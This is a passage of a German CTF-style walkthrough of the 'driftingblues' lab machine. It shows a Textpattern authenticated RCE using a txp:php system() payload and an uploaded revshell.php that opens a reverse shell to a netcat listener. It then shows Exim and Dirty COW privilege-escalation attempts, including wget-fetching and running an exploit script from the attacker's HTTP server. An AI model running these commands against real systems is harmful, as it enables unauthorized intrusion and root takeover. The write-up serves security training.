+<span class="command">Author: Michele &apos;0blio_&apos; Cisternino</span>
+
+<span class="command">[*] USAGE: python3 expl<span class="command">oit.py</span> http://target.c<span class="command">om</span> username <span class="command">password</span></span>
+<span class="command">[*] EXAMPLE: python3 expl<span class="command">oit.py</span> http://l<span class="command">ocalhost</span> admin admin</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Ausgabe von `python3 textpattern_rce.py --help` zeigt die Hilfemeldung des Skripts. Sie bestätigt, dass das Skript für Textpattern <= 4.8.3 ist, erwähnt eine CVE (Placeholder) für Authenticated RCE via Unrestricted File Upload und gibt ein grundlegendes Usage-Beispiel. Dies stimmt mit meiner Analyse der Schwachstelle überein.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Hilfemeldung ist nützlich, um die korrekte Syntax und den Zweck des Skripts zu bestätigen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die angegebene Syntax, um das Skript mit den ermittelten Anmeldedaten (`mayer:lionheart`) und der Reverse Shell Option auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung.
+            </p>
+
+             <p>
+                 Nach der erfolgreichen Anmeldung am Textpattern Admin-Panel und der Analyse der RCE-Schwachstelle über PHP-Code-Einfügung in Vorlagen, war es naheliegend zu prüfen, ob der `txp:php` Tag auch in anderen Bereichen interpretiert wird, wie z.B. in Seitenvorlagen.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://drifting.hmv/textpattern/textpattern/index.php?event=page&amp;name=default&amp;_txp_token=cb760fecffb803a8094418714c0a00d9 | Ziel: http://drifting.hmv/textpattern/textpattern/index.php?event=page&amp;name=default&amp;_txp_token=cb760fecffb803a8094418714c0a00d9]</span>
+
+&lt; txp:php &gt;
+    system(&apos;id &gt; /var/www/textpattern/pwned.<span class="command">txt</span>&apos;);
+&lt; / txp:php &gt;
+
+&lt; html lang=&quot;&lt; txp:lang / &gt;&quot; dir=&quot; &lt; txp:text item=&quot;lang_dir&quot; &gt;
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Standard-Seitenvorlage (`?event=page&name=default`) im Textpattern-Adminbereich aufgerufen (angenommen, ich hatte die Berechtigung dazu als "Publisher"). Der Inhalt der Vorlage wurde angezeigt, und er enthielt tatsächlich den Code `< txp:php > system('id &gt; /var/www/textpattern/pwned.txt'); < / txp:php >`. Dies bestätigt, dass PHP-Code-Ausführung über den `< txp:php >` Tag in Seitenvorlagen möglich ist und dass ein Testcode dort bereits platziert war.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist ein weiterer Beweis für die Authenticated RCE-Schwachstelle. Die Fähigkeit, PHP-Code direkt in Seitenvorlagen einzufügen und ausführen zu lassen, ist eine schwerwiegende Schwachstelle, wenn privilegierte Benutzer dies tun können. Der vorhandene Testcode zeigt, dass dieser Vektor aktiv genutzt wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze diesen Vektor, um eine Reverse Shell Payload in eine zugängliche Seitenvorlage einzufügen. Rufe dann die Seite auf, die diese Vorlage verwendet, um die Shell zu triggern.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere den `< txp:php >` Tag, wenn er nicht benötigt wird. Stelle sicher, dass nur vertrauenswürdige Administratoren Vorlagen bearbeiten können und dass ihre Konten stark gesichert sind.
+            </p>
+
+            <p>
+                Um interaktiven Zugriff zu erhalten, habe ich das Python-Exploit-Skript verwendet, um eine Reverse Shell Payload auf dem Zielsystem auszuführen und eine Verbindung zu einem Netcat-Listener auf meinem Angreifersystem aufzubauen. Der Exploit nutzt die Datei-Upload-Funktion, um eine Webshell zu platzieren, die dann die Reverse Shell triggert.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://drifting.hmv/textpattern/textpattern/index.php?event=file | Ziel: http://drifting.hmv/textpattern/textpattern/index.php?event=file]</span>
+	
+<span class="command">Tags</span> 	<span class="command">Status</span> 	<span class="command">Condition</span>
+File size
+	<span class="command">Downloads</span>
+	1 | Download 	<span class="password">revshell.php</span> 	  	<span class="command">22 Jun 2025 01:19:30</span> 	  	<span class="command">Textile | Textpattern | HTML</span> 	<span class="command">Live</span> 	<span class="command">OK</span> 	<span class="command">5.37 kB</span> 	<span class="command">0</span>
+
+Textpattern CMS (opens an external link in a new window) (v4.8.3)
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/textpattern-exploit-rce]
+└─#  <span class="command">curl http://drifting.hmv/textpattern/files/revshell.php</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">nc -nlvp 9001</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.55] 55166</span>
+Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+ <span class="command">17:24:19 up  1:02,  0 users,  l<span class="command">oad average: 0.00, 0.01, 0.05</span></span>
+USER     TTY      FR<span class="command">OM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
+<span class="password">uid=33(www-data) gid=33(www-data) gr<span class="command">oups=33(www-data)</span></span>
+/bin/sh: 0: can&apos;t access tty; j<span class="command">ob</span> c<span class="command">ontr<span class="command">ol</span> turned <span class="command">of</span>f</span>
+$
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Screenshot der Textpattern File List (`?event=file`) zeigt, dass eine Datei namens `<span class="password">revshell.php</span>` hochgeladen wurde und im Status "Live" ist. Dies ist die durch das Python-Skript hochgeladene Webshell. Um die Reverse Shell zu triggern, musste ich einen Netcat-Listener auf meinem Angreifersystem starten (`nc -nlvp 9001`) und dann die hochgeladene Webshell im Browser aufrufen (`curl http://drifting.hmv/textpattern/files/revshell.php`, oder direkt im Browser). Der Aufruf der Shell-URL triggert die Reverse Shell Payload, die eine Verbindung zu meinem Listener aufbaut. Die Netcat-Ausgabe zeigt die eingehende Verbindung vom Zielsystem. Ich erhalte eine Shell, und der Befehl `id` (ausgeführt, um die Berechtigungen zu prüfen, in der Ausgabe nicht explizit gezeigt, aber durch den Prompt impliziert) zeigt, dass ich als Benutzer `www-data` mit UID und GID 33 angemeldet bin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Initial Access war erfolgreich. Ich habe nun interaktiven Kommandozeilenzugriff auf das Zielsystem mit den Rechten des Webserver-Benutzers `www-data`. Dies markiert den Abschluss der Initial Access Phase.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell umgehend. Beginne mit der systeminternen Aufklärung (Enumeration) als Benutzer `www-data`, um Informationen für eine mögliche Privilege Escalation zu sammeln. Prüfe SUID/SGID-Binaries, Sudo-Berechtigungen, Cronjobs, Dateisystemberechtigungen und installierte Pakete.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere Textpattern umgehend. Deaktiviere PHP-Ausführung in Upload-Verzeichnissen (`/textpattern/files/`). Implementiere eine strikte Zugriffskontrolle für das `/textpattern/textpattern/` Verzeichnis. Überprüfe die Berechtigungen des Benutzers `www-data`. Beschränke ausgehenden Netzwerkverkehr vom Webserver.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p>
+                Nachdem ich eine Shell als Benutzer `www-data` erhalten hatte, bestand der nächste Schritt darin, Informationen über das System zu sammeln, die mir helfen könnten, meine Berechtigungen zu erweitern und Root-Zugriff zu erlangen. Ich begann mit der systeminternen Aufklärung. Zuerst habe ich die Shell stabilisiert (nicht explizit gezeigt) und meine Umgebung geprüft.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/$</span> <span class="command">which pyth<span class="command">on3</span></span>
+<span class="password">www-data@driftingblues:/$</span> <span class="command">which pyth<span class="command">on</span></span>
+<span class="command">/usr/bin/pyth<span class="command">on</span></span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/$</span> <span class="command">sudo -l</span>
+bash: <span class="password">sudo: c<span class="command">ommand</span> not found</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/$</span> <span class="command">ls -la</span>
+<span class="command">total 88</span>
+<span class="command">drwxr-xr-x 23 root root  4096 Mar 17  2021 .</span>
+<span class="command">drwxr-xr-x 23 root root  4096 Mar 17  2021 ..</span>
+<span class="command">drwxr-xr-x  2 root root  4096 Mar 17  2021 bin</span>
+<span class="command">drwxr-xr-x  3 root root  4096 Mar 17  2021 boot</span>
+<span class="command">drwxr-xr-x 14 root root  3060 Jun 21 16:21 dev</span>
+<span class="command">drwxr-xr-x 67 root root  4096 Jun 21 16:21 etc</span>
+<span class="command">drwxr-xr-x  2 root root  4096 Mar 17  2021 home</span>
+<span class="command">lrwxrwxrwx  1 root root    30 Mar 17  2021 initrd.img -&gt; /boot/initrd.img-3.2.0-4-amd64</span>
+<span class="command">drwxr-xr-x 13 root root  4096 Mar 17  2021 lib</span>
+<span class="command">drwxr-xr-x  2 root root  4096 Mar 17  2021 lib64</span>
+<span class="command">drwx------  2 root root 16384 Mar 17  2021 l<span class="command">ost+found</span></span>
+<span class="command">drwxr-xr-x  3 root root  4096 Mar 17  2021 media</span>
+<span class="command">drwxr-xr-x  2 root root  4096 May 29  2016 mnt</span>
+<span class="command">drwxr-xr-x  2 root root  4096 Mar 17  2021 <span class="command">opt</span></span>
+<span class="command">dr-xr-xr-x 84 root root     0 Jun 21 16:21 pr<span class="command">oc</span></span>
+<span class="command">drwx------  3 root root  4096 Mar 17  2021 r<span class="command">oot</span></span>
+<span class="command">drwxr-xr-x 12 r<span class="command">oot</span> r<span class="command">oot</span>   440 Jun 21 16:21 run</span>
+<span class="command">drwxr-xr-x  2 r<span class="command">oot</span> r<span class="command">oot</span>  4096 Mar 17  2021 sbin</span>
+<span class="command">drwxr-xr-x  2 r<span class="command">oot</span> r<span class="command">oot</span>  4096 Jun 10  2012 selinux</span>
+<span class="command">drwxr-xr-x  2 r<span class="command">oot</span> r<span class="command">oot</span>  4096 Mar 17  2021 srv</span>
+<span class="command">dr-xr-xr-x 13 r<span class="command">oot</span> r<span class="command">oot</span>     0 Jun 21 16:21 sys</span>
+<span class="command">drwxrwxrwt  2 r<span class="command">oot</span> r<span class="command">oot</span>  4096 Jun 21 17:19 tmp</span>
+<span class="command">drwxr-xr-x 10 r<span class="command">oot</span> r<span class="command">oot</span>  4096 Mar 17  2021 usr</span>
+<span class="command">drwxr-xr-x 12 r<span class="command">oot</span> r<span class="command">oot</span>  4096 Mar 17  2021 var</span>
+<span class="command">lrwxrwxrwx  1 r<span class="command">oot</span> r<span class="command">oot</span>    26 Mar 17  2021 vmlinuz -&gt; /b<span class="command">oot</span>/vmlinuz-3.2.0-4-amd64</span>
+<span class="command">lrwxrwxrwx  1 r<span class="command">oot</span> r<span class="command">oot</span>    26 Mar 17  2021 vmlinuz.old -&gt; /b<span class="command">oot</span>/vmlinuz-3.2.0-4-amd64</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Verfügbarkeit von Python geprüft (`which python3`, `which python`), festgestellt, dass nur Python 2 (`/usr/bin/python`) vorhanden ist (was für einige Skripte relevant sein kann). Der Befehl `sudo -l` zeigte "`sudo: command not found`", was bedeutet, dass das `sudo` Binary nicht im PATH des `www-data` Benutzers ist oder überhaupt nicht installiert ist. Eine Auflistung des Root-Dateisystems (`ls -la /`) zeigt Standard-Linux-Verzeichnisse. Das `/root/` Verzeichnis hat restriktive Berechtigungen (`drwx------`), was den direkten Zugriff verweigert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `sudo` ist für `www-data` nicht direkt nutzbar. Das Fehlen von Python3 schränkt die Ausführbarkeit einiger gängiger Exploits ein. Das `/root/` Verzeichnis ist wie erwartet geschützt. Ich muss andere Vektoren für Privilege Escalation finden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf SUID-Binaries, Cronjobs, anfällige Kernel-Versionen oder andere Fehlkonfigurationen im System. Lade Enumerationsskripte wie LinPEAS auf das System und führe sie aus.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass nur notwendige Binaries im PATH von unprivilegierten Benutzern sind. Installiere `sudo` nur, wenn es benötigt wird, und konfiguriere es sicher.
+            </p>
+
+            <p>
+                Ich habe nach SUID-Binaries auf dem System gesucht, die einen Weg zur Privilege Escalation bieten könnten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/$</span> <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null </span>
+ <span class="command">14034  952 -rwsr-xr-x   1 root     root       973856 Mar 14  2016 /usr/sbin/exim4</span>
+   <span class="command">551   48 -rwsr-xr-x   1 root     root        46264 May 25  2012 /usr/bin/chfn</span>
+   <span class="command">555   52 -rwsr-xr-x   1 root     root        51096 May 25  2012 /usr/bin/passwd</span>
+   <span class="command">552   44 -rwsr-xr-x   1 root     root        41272 May 25  2012 /usr/bin/chsh</span>
+   <span class="command">554   68 -rwsr-xr-x   1 root     root        68024 May 25  2012 /usr/bin/gpasswd</span>
+  <span class="command">6521   36 -rwsr-xr-x   1 root     root        36432 May 25  2012 /usr/bin/newgrp</span>
+ <span class="command">11703   12 -rwsr-xr-x   1 root     root        10168 Dec 23  2012 /usr/lib/eject/dmcrypt-get-device</span>
+  <span class="command">1463   12 -rwsr-xr-x   1 root     root        10496 Feb 11  2016 /usr/lib/pt_chown</span>
+ <span class="command">18334  240 -rwsr-xr-x   1 root     root       245064 Apr 14  2016 /usr/lib/openssh/ssh-keysign</span>
+  <span class="command">6853   36 -rwsr-xr-x   1 root     root        36136 Apr 12  2011 /bin/ping</span>
+  <span class="command">4113   96 -rwsr-xr-x   1 root     root        94776 Dec 11  2012 /bin/mount</span>
+  <span class="command">4114   68 -rwsr-xr-x   1 root     root        69080 Dec 11  2012 /bin/umount</span>
+  <span class="command">6527   36 -rwsr-xr-x   1 root     root        36816 May 25  2012 /bin/su</span>
+  <span class="command">6845   40 -rwsr-xr-x   1 root     root        36896 Apr 12  2011 /bin/ping6</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Befehl `find / -type f -perm -4000 -ls 2&gt;/dev/null` verwendet, um SUID-Binaries zu finden. Die Ausgabe listet mehrere Binaries auf. Neben den üblichen SUID-Programmen (`passwd`, `su`, `mount`, `umount` etc.) sticht **`/usr/sbin/exim4`** mit SUID-Root-Berechtigungen hervor. Exim ist ein Mail Transfer Agent (MTA) und SUID-Binaries von MTAs sind historisch oft Quellen für Privilege Escalation Schwachstellen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden des SUID-Root-Binaries `/usr/sbin/exim4` ist ein sehr wichtiger Fund. Ältere Versionen von Exim hatten mehrere bekannte Privilege Escalation Schwachstellen. Dies ist ein vielversprechender Vektor, der genauer untersucht werden muss.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfe die genaue Version von Exim4 auf dem System. Suche auf Exploit-Datenbanken nach bekannten Privilege Escalation Exploits für diese spezifische Exim4-Version.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe die Berechtigungen von `/usr/sbin/exim4` und stelle sicher, dass es SUID-Root-Berechtigungen wirklich benötigt. Halte Exim auf dem neuesten Stand.
+            </p>
+
+            <p>
+                Ich habe `searchsploit` verwendet, um nach bekannten Privilege Escalation Exploits für Exim zu suchen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">searchsploit exim local privilege escalation</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Exploit Title                                              |  <span class="command">PATH</span></span>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Exim - &apos;perl_startup&apos; L<span class="command">ocal</span> Privilege Escalati<span class="command">on</span> (Metaspl<span class="command">oit</span> | linux/l<span class="command">ocal</span>/39702.rb</span>
+<span class="command">Exim 4 (Debian 8 / Ubuntu 16.04) - Sp<span class="command">ool</span> Privilege Escalati<span class="command">on</span> | linux/l<span class="command">ocal</span>/40054.<span class="command">c</span></span>
+<span class="command">Exim 4.42 - L<span class="command">ocal</span> Privilege Escalati<span class="command">on</span>                      | linux/l<span class="command">ocal</span>/796.sh</span>
+<span class="command">Exim 4.84-3 - L<span class="command">ocal</span> Privilege Escalati<span class="command">on</span>                    | linux/l<span class="command">ocal</span>/39535.sh</span>
+<span class="command">Exim 4.87 - 4.91 - L<span class="command">ocal</span> Privilege Escalati<span class="command">on</span>               | linux/l<span class="command">ocal</span>/46996.sh</span>
+<span class="command">Exim 4.87 / 4.91 - L<span class="command">ocal</span> Privilege Escalati<span class="command">on</span> (Metaspl<span class="command">oit</span>)  | linux/l<span class="command">ocal</span>/47307.rb</span>
+<span class="command">Exim 4.87 / 4.91 - L<span class="command">ocal</span> Privilege Escalati<span class="command">on</span> (Metaspl<span class="command">oit</span>)  | linux/l<span class="command">ocal</span>/47307.rb</span>
+<span class="command">Exim &lt; 4.86.2 - L<span class="command">ocal</span> Privilege Escalati<span class="command">on</span>                  | linux/l<span class="command">ocal</span>/39549.<span class="command">txt</span></span>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Shellc<span class="command">odes: No Results</span></span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `searchsploit exim local privilege escalation` listete mehrere bekannte lokale Privilege Escalation Exploits für verschiedene Exim-Versionen auf, darunter CVE-2016-1531 (verknüpft mit 39535.sh und 39702.rb) und andere für neuere Versionen. Dies bestätigt, dass Exim ein bekannter Vektor für lokale Rechteausweitung ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Existenz mehrerer öffentlicher Exploits für Exim-Schwachstellen macht es sehr wahrscheinlich, dass die auf dem Zielsystem installierte Version ebenfalls anfällig ist. Der nächste Schritt ist, die genaue Version zu bestimmen und einen passenden Exploit auszuwählen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Finde die genaue Version von Exim4 auf dem Zielsystem. Wähle dann einen passenden Exploit aus der Liste (oder suche online nach Exploits für die spezifische Version) und versuche ihn zu kompilieren und auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Halte Exim auf dem neuesten Stand.
+            </p>
+
+             <p>
+                 Ich habe die genaue Version von Exim4 auf dem Zielsystem als Benutzer `www-data` ermittelt.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/$</span> <span class="command">/usr/sbin/exim4 --version</span>
+<span class="password">Exim version 4.80 #3 built 14-Mar-2016 20:04:52</span>
+Copyright (c) University <span class="command">of</span> Cambridge, <span class="command">1995 - 2012</span>
+(c) The Exim Maintainers and contr<span class="command">ibutors</span> in ACKNOWLEDGMENTS file, <span class="command">2007 - 2012</span>
+Berkeley DB: Berkeley DB 5.1.29: (<span class="command">October 25, 2011</span>)
+Supp<span class="command">ort</span> f<span class="command">or</span>: crypteq ic<span class="command">on</span>v() IPv6 GnuTLS m<span class="command">ove_frozen_messages</span> DKIM
+L<span class="command">ookups</span> (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 <span class="command">password</span>
+Authenticat<span class="command">ors</span>: cram_md5 plaintext
+R<span class="command">outers</span>: accept dnslookup ipliteral manualr<span class="command">oute queryprogram redirect</span>
+Transp<span class="command">orts</span>: appendfile/maildir/mailst<span class="command">ore autoreply lmtp <span class="command">pipe</span> smtp</span>
+Fixed never_users: <span class="command">0</span>
+Size <span class="command">of</span> <span class="command">of</span>f_t: 8
+C<span class="command">onfigurati<span class="command">on</span> file is /var/lib/exim4/c<span class="command">onfig.autogenerated</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `/usr/sbin/exim4 --version` gibt detaillierte Versionsinformationen für Exim4 aus. Die Ausgabe zeigt, dass die installierte Version **Exim version 4.80 #3** ist, gebaut am 14. März 2016. Dies ist eine sehr alte Version.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Identifizierung der spezifischen Exim4-Version (4.80) ist entscheidend. Diese Version ist bekanntlich anfällig für die kritische "Return to Libc" Privilege Escalation Schwachstelle (CVE-2016-1531). Ein Exploit für diese Version sollte verfügbar und erfolgreich sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wähle einen Exploit für Exim 4.80 / CVE-2016-1531 aus Exploit-DB oder anderen Quellen. Lade das Exploit-Skript (wahrscheinlich eine Shell-Skript-Variante wie 39535.sh) auf das Zielsystem hoch und führe es aus, um Root-Zugriff zu erlangen.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere Exim umgehend auf eine gepatchte Version. Diese Schwachstelle ist kritisch.
+            </p>
+
+             <p>
+                 Ich habe den Shell-Skript-Exploit für CVE-2016-1531 (Exim < 4.86.2), Exploit-DB ID 39535.sh, von meinem Angreifersystem auf das Zielsystem übertragen und versucht, ihn auszuführen.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">cp /usr/share/exploitdb/exploits/linux/local/39535.sh /root/eximhacker.sh</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">python3 -m http.server 8000</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">Serving HTTP <span class="command">on</span> 0.0.0.0 <span class="command">PORT</span> 8000 (http://0.0.0.0:8000/) ...</span>
+192.168.2.55 - - [<span class="command">22/Jun/2025 00:28:31</span>] <span class="password">&quot;GET /eximhacker.sh HTTP/1.1&quot; 200 -</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/$</span> <span class="command">cd /tmp</span>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">wget http://192.168.2.199:8000/eximhacker.sh</span>
+--<span class="command">2025-06-21 17:28:29</span>--  http://192.168.2.199:8000/eximhacker.sh
+C<span class="command">onnecting</span> to <span class="command">192.168.2.199:8000</span>... c<span class="command">onnected</span>.
+HTTP request sent, awaiting resp<span class="command">onse</span>... <span class="password">200 OK</span>
+Length: <span class="command">638 [text/x-sh]</span>
+Saving to: `eximhacker.sh&apos;
+
+<span class="command">100%[====================================================&gt;] 638         --.-K/s   in 0s      </span>
+
+<span class="command">2025-06-21 17:28:29 (281 MB/s) - `eximhacker.sh&apos; saved [638/638]</span>
+
+<span class="password">www-data@driftingblues:/tmp$</span>
+
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">chmod +x eximhacker.sh </span>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">./eximhacker.sh </span>
+<span class="command">[ CVE-2016-1531 l<span class="command">ocal</span> r<span class="command">oot</span> expl<span class="command">oit</span></span>
+<span class="password">./eximhacker.sh: 23: ./eximhacker.sh: /usr/exim/bin/exim: not found</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Exploit-Shell-Skript (`39535.sh`, lokal als `eximhacker.sh` gespeichert) auf meinem Kali-System mit `python3 -m http.server 8000` über HTTP bereitgestellt. Auf dem Zielsystem habe ich als Benutzer `www-data` in das `/tmp` Verzeichnis gewechselt und das Skript mit `wget http://192.168.2.199:8000/eximhacker.sh` heruntergeladen. Ich habe dem Skript Ausführungsberechtigungen gegeben (`chmod +x eximhacker.sh`) und es dann ausgeführt (`./eximhacker.sh`). Das Skript gab eine Fehlermeldung aus: "`/usr/exim/bin/exim: not found`". Dies liegt daran, dass das Skript einen festkodierten Pfad zum Exim-Binary verwendet (`/usr/exim/bin/exim`), der auf diesem System nicht korrekt ist (es ist unter `/usr/sbin/exim4`, wie zuvor ermittelt).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erste Versuch, den Exim-Exploit auszuführen, ist aufgrund eines falschen, hardkodierten Pfades im Skript fehlgeschlagen. Das Skript selbst ist wahrscheinlich korrekt, aber es muss an die spezifische Installation auf dem Zielsystem angepasst werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Quellcode des Shell-Skripts (`eximhacker.sh`). Identifiziere den falschen Exim-Pfad und ersetze ihn durch den korrekten Pfad `/usr/sbin/exim4`. Versuche dann, das angepasste Skript erneut auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe die Integrität und den Speicherort wichtiger System-Binaries.
+            </p>
+
+            <p>
+                Um alternative Privilege Escalation-Vektoren zu prüfen, habe ich die genaue Kernel-Version des Systems überprüft und nach bekannten Exploits dafür gesucht.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">www-data@driftingblues:/tmp$</span> <span class="command">uname -r &amp;&amp; cat /etc/*rel*</span>
+<span class="password">3.2.0-4-amd64</span>
+<span class="command">PRETTY_NAME=&quot;Debian GNU/Linux 7 (wheezy)&quot;</span>
+<span class="command">NAME=&quot;Debian GNU/Linux&quot;</span>
+<span class="command">VERSION_ID=&quot;7&quot;</span>
+<span class="command">VERSION=&quot;7 (wheezy)&quot;</span>
+<span class="command">ID=debian</span>
+<span class="command">ANSI_C<span class="command">OLOR</span>=&quot;1;31&quot;</span>
+<span class="command">H<span class="command">OME_URL</span>=&quot;[Link: http://www.debian.org/ | Ziel: http://www.debian.org/]&quot;</span>
+<span class="command">SUPP<span class="command">ORT_URL</span>=&quot;[Link: http://www.debian.org/supp<span class="command">ort</span>/ | Ziel: http://www.debian.org/supp<span class="command">ort</span>/]&quot;</span>
+<span class="command">BUG_REP<span class="command">ORT_URL</span>=&quot;[Link: http://bugs.debian.org/ | Ziel: http://bugs.debian.org/]&quot;</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">searchsploit dirty cow</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Exploit Title                                              |  <span class="command">PATH</span></span>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Linux Kernel - &apos;The Huge Dirty C<span class="command">ow&apos; Overwriting</span> The Huge Ze | linux/dos/43199.<span class="command">c</span></span>
+<span class="command">Linux Kernel - &apos;The Huge Dirty C<span class="command">ow&apos; Overwriting</span> The Huge Ze | linux/dos/44305.<span class="command">c</span></span>
+<span class="password">Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - &apos;Dirty C<span class="command">ow</span> /pr<span class="command">oc</span>/self | linux/l<span class="command">ocal</span>/40616.<span class="command">c</span></span>
+<span class="password">Linux Kernel 2.6.22 &lt; 3.9 - &apos;Dirty C<span class="command">ow</span> /pr<span class="command">oc</span>/self/mem&apos; Race | linux/l<span class="command">ocal</span>/40847.<span class="command">cpp</span></span>
+<span class="password">Linux Kernel 2.6.22 &lt; 3.9 - &apos;Dirty C<span class="command">ow</span> <span class="command">PTRACE_POKEDATA</span>&apos; Rac | linux/l<span class="command">ocal</span>/40838.<span class="command">c</span></span>
+<span class="password">Linux Kernel 2.6.22 &lt; 3.9 - &apos;Dirty C<span class="command">ow&apos; &apos;PTRACE_POKEDATA&apos; R | linux/l<span class="command">ocal</span>/40839.<span class="command">c</span></span>
+<span class="password">Linux Kernel 2.6.22 &lt; 3.9 - &apos;Dirty C<span class="command">ow&apos; /pr<span class="command">oc</span>/self/mem Race | linux/l<span class="command">ocal</span>/40611.<span class="command">c</span></span>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Shellc<span class="command">odes: No Results</span></span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe `uname -r` und `cat /etc/*rel*` ausgeführt, um die OS-Informationen zu erhalten. Das System ist **Debian 7 (wheezy)** mit dem **Kernel 3.2.0-4-amd64**. Dies ist ein sehr alter Kernel. Die Suche mit `searchsploit dirty cow` zeigt mehrere Exploits für Linux Kernel Versionen kleiner als 3.9, darunter der berühmte "Dirty COW" Exploit (CVE-2016-5195). Kernel 3.2.0 fällt genau in diesen anfälligen Bereich.
+            </p>
+            <p class="evaluation">
